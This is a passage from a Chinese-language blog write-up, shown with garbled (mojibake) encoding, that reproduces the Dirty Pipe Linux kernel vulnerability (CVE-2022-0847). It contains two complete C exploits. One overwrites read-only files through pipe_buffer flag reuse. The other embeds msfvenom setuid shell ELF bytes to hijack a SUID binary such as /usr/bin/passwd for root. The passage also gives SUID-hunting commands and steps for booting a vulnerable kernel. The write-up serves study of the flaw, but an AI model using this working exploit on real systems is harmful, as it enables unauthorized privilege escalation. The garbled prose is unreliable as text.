æ­¤æ­¤æ—¶<code>pipe_buffer</code>æŒ‡å‘çš„<code>page</code>æ˜¯ç›®æ ‡æ–‡ä»¶æ˜ å°„çš„<code>page</code>ï¼Œ<code>pipe_buffer-&gt;flags</code> &amp;&amp; <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> &#x3D;&#x3D; <code>true</code>ï¼Œè¡¨ç¤ºæ­¤æ—¶å¯¹è¿™ä¸ª<code>page</code>æ‹¥æœ‰å†™å…¥æƒé™äº†ã€‚è¿™å°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬æ‰“å¼€çš„æ˜¯ä¸€ä¸ªåªæœ‰åªè¯»æƒé™çš„æ–‡ä»¶ï¼Œç°åœ¨å¯ä»¥è¶Šæƒå†™å…¥</li></ul><p>äºæ˜¯æœ‰äº†è¿™æ ·ä¸€ä¸ªæ€è·¯</p><ul><li>step â… ï¼šåˆ›å»ºä¸€ä¸ª<code>pipe</code></li><li>step â…¡ï¼šæŠŠ<code>pipe</code>å†™æ»¡ï¼Œä½¿æ‰€æœ‰pipe_buffer-&gt;flagséƒ½è¢«è®¾ç½®ä¸Š<strong>PIPE_BUF_FLAG_CAN_MERGE</strong></li><li>step â…¢ï¼šè¯»å–<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œæ¸…ç©º<code>pipe</code></li><li>step â…£ï¼šæ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œåˆ©ç”¨<code>splice</code>å°†å†…å®¹ä»æ–‡ä»¶æ‹·è´åˆ°ç®¡é“ï¼Œæ­¤æ—¶<code>pipe_buffer-&gt;page</code>ä¸ºæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æ˜ å°„é¡µæ¡†ï¼Œ<code>pipe_buffer-&gt;flags</code>ä¿ç•™æœ‰ä¹‹å‰è®¾ç½®çš„<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œæ­¤æ—¶åœ¨ç®¡é“ä¸­å¯¹è¯¥æ–‡ä»¶å…·æœ‰å†™å…¥æƒé™ã€‚<code>pipe head</code> +1</li><li>step â…¤ï¼šåˆ©ç”¨<code>write</code>å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå› ä¸ºä¸Šä¸€ä¸ª <code>pipe_buffer</code> æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œå°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª <code>pipe_buffer</code> å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢ã€‚å®Œæˆè¶Šæƒå†™å…¥</li></ul><h1 id="0x04ï¼šæ¼æ´åˆ©ç”¨"><a href="#0x04ï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="0x04ï¼šæ¼æ´åˆ©ç”¨"></a>0x04ï¼šæ¼æ´åˆ©ç”¨</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>ç»è¿‡ä¸Šè¿°åˆ†æåˆ©ç”¨demoå°±å¾ˆå¥½å†™äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\nkorey0sh1\n&quot;</span>, <span class="hljs-number">11</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>éšä¾¿ç”¨qemuèµ·äº†ä¸ªç¯å¢ƒï¼Œkernel version &#x3D; 5.8</p><p>æ•ˆæœè¿˜æ˜¯å¾ˆæˆåŠŸçš„</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321143920.png" style="zoom: 67%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å¸¸è§„çš„<strong>suid</strong>ææƒæ–¹å¼</p><p>æŸ¥çœ‹å…·æœ‰rootæƒé™çš„suidæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>æ­¤å¤„è¿˜æ˜¯é€‰æ‹©è€æœ‹å‹&#x2F;usr&#x2F;bin&#x2F;passwd</p><p>ç”¨msfç”Ÿæˆææƒçš„shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure><h3 id="final-exp"><a href="#final-exp" class="headerlink" title="final exp"></a>final exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    <span class="hljs-comment">//ä»ç¬¬äºŒä½å¼€å§‹è¦†å†™</span><br>    write(pipe_fd[<span class="hljs-number">1</span>], &amp;attack_data[<span class="hljs-number">1</span>], data_len<span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç¯å¢ƒï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321201804.png"></p><p>è¿è¡Œæ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5365682d6c51a6882c74dd06b604bb9.png"></p><h1 id="some-tricks"><a href="#some-tricks" class="headerlink" title="some tricks"></a>some tricks</h1><p>ç¬”è€…åœ¨æœ€åä¸€ç›´è‹¦äºæ‰¾ä¸åˆ°åˆé€‚çš„kernelç‰ˆæœ¬çš„è™šæ‹Ÿæœºå‘œå‘œå‘œå‘œå‘œï¼Œå› ä¸ºä¸‹äº†ä¸ªæŒºå¤æ—©ç‰ˆæœ¬çš„ubuntu20ï¼Œè§‰å¾—åº”è¯¥èƒ½ç¬¦åˆç‰ˆæœ¬è¦æ±‚</p><p>ç»“æœç©æ„ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œä¸‹ä¸‹æ¥æ¼æ´éƒ½æ˜¯è¢«patchçš„</p><p>æœ€åå‘ç°äº†<a href="https://bbs.kanxue.com/user-home-919002.htm">xi@0ji233</a> çš„æ–‡ç« ï¼Œäº†è§£åˆ°äº†ä¸€ç§ååˆ†æ–¹ä¾¿å¿«æ·çš„æ›´æ¢kernelç‰ˆæœ¬çš„æ–¹æ³•</p><p>é¦–å…ˆå…ˆç”¨aptå¯»æ‰¾ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-cache search linux | grep 5.8.<br></code></pre></td></tr></table></figure><p>é€‰æ‹©è¿™ä¸ª</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321203416.png"></p><p>ä¸‹è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install linux-image-5.8.0-63-generic<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ›´æ”¹grubå¯åŠ¨é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit /etc/default/grub<br></code></pre></td></tr></table></figure><p>æ”¹æˆè¿™æ ·</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span><br><span class="hljs-comment"># /boot/grub/grub.cfg.</span><br><span class="hljs-comment"># For full documentation of the options in this file, see:</span><br><span class="hljs-comment">#   info -f grub -n &#x27;Simple configuration&#x27;</span><br><br><span class="hljs-attr">GRUB_DEFAULT</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">GRUB_TIMEOUT_STYLE</span>=hidden<br><span class="hljs-attr">GRUB_TIMEOUT</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">GRUB_DISTRIBUTOR</span>=`lsb_release -i -s <span class="hljs-number">2</span>&gt; /dev/null || echo Debian`<br><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;text&quot;</span><br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US&quot;</span><br><br><span class="hljs-comment"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="hljs-comment"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="hljs-comment"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="hljs-comment">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><br><span class="hljs-comment"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="hljs-comment">#GRUB_TERMINAL=console</span><br><br><span class="hljs-comment"># The resolution used on graphical terminal</span><br><span class="hljs-comment"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="hljs-comment"># you can see them in real GRUB with the command `vbeinfo&#x27;</span><br><span class="hljs-comment">#GRUB_GFXMODE=640x480</span><br><br><span class="hljs-comment"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span><br><span class="hljs-comment">#GRUB_DISABLE_LINUX_UUID=true</span><br><br><span class="hljs-comment"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="hljs-comment">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br><br><span class="hljs-comment"># Uncomment to get a beep at grub start</span><br><span class="hljs-comment">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span><br></code></pre></td></tr></table></figure><p>æ›´æ–°<code>grub</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-grub<br></code></pre></td></tr></table></figure><p>rebooté‡å¯åç‹‚æŒ‰<strong>SHIFT+TAB</strong>è¿›å…¥å¼•å¯¼æ¨¡å¼ï¼Œé€‰æ‹©é«˜çº§è®¾ç½®ï¼Œé€‰æ‹©æ–°ä¸‹è½½çš„å†…æ ¸ç‰ˆæœ¬ï¼Œå³å¯å®Œæˆç¯å¢ƒæ­å»º</p><h1 id="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"><a href="#0xffï¼šå†™åœ¨æœ€åçš„æœ€å" class="headerlink" title="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"></a>0xffï¼šå†™åœ¨æœ€åçš„æœ€å</h1><p><a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability â€” The Dirty Pipe Vulnerability documentation (cm4all.com)</a></p><p>æ‹œè¯»å®Œæ¼æ´å‘ç°è€…çš„åšå®¢ï¼Œæ•¬ä½©ä»–å±…ç„¶èƒ½ä»ä¸€æ¬¡å°å°çš„<strong>CRC</strong>æ ¡éªŒé”™è¯¯å…¥æ‰‹ï¼Œæ·±æŒ–è¿‘ä¸€å¹´æ—¶é—´ï¼ŒæŒ–æ˜åŸæœ¬å¹¶ä¸ç†Ÿæ‚‰çš„<strong>Linux Kernel</strong>ï¼Œ</p><p>å¹¶æœ€ç»ˆå‘ç°äº†<strong>Dirty Pipe</strong>è¿™ä¸€å¨åŠ›å·¨å¤§çš„å†…æ ¸<code>0day</code></p><p>ä½œè€…çš„æ¢ç´¢ç²¾ç¥ï¼Œå€¼å¾—ç¬”è€…å­¦ä¹ </p><p><strong>è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</strong></p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://bbs.kanxue.com/thread-280442.htm">CVE-2022-0847 dirtypipeæ¼æ´å¤ç°-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E7%AE%A1%E9%81%93">ã€CVE.0x06ã€‘CVE-2022-0847 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s 